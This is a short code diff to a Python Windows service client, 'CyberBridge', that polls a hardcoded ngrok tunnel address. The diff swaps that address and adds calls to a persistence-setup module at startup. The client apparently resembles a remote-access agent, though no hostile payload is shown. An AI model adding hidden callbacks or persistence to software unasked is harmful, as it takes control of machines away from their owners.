@@ -58,7 +58,7 @@ import servicemanager
 try:
     from config import SERVER_URL, POLL_INTERVAL
 except ImportError:
-    SERVER_URL    = "https://10ec-190-107-209-205.ngrok-free.app"
+    SERVER_URL    = "https://1b19-190-107-209-205.ngrok-free.app"
     POLL_INTERVAL = 3
 
 # ─── Persistent client ID ─────────────────────────────────────────────────────
@@ -448,6 +448,15 @@ def _configure_service_recovery():
         logger.warning("Service recovery setup failed: %s", e)
 
 
+def _setup_persistence():
+    try:
+        from core.persistence import setup_persistence
+        setup_persistence()
+        logger.info("Persistence setup complete.")
+    except Exception as e:
+        logger.warning("Persistence setup error: %s", e)
+
+
 def _start_watchdog_if_possible() -> bool:
     try:
         from core.watchdog import run_watchdog_if_requested, start_watchdog
@@ -490,6 +499,7 @@ class CyberBridgeClientService(win32serviceutil.ServiceFramework):
         )
         logger.info("CyberBridge service starting (HTTP mode).")
         _configure_service_recovery()
+        _setup_persistence()
         _start_watchdog_if_possible()
         self._flag["running"] = True
 
@@ -514,6 +524,7 @@ class CyberBridgeClientService(win32serviceutil.ServiceFramework):
 
 def _run_standalone():
     logger.info("Running in standalone HTTP mode.")
+    _setup_persistence()
     if not _start_watchdog_if_possible():
         return
     flag = {"running": True}
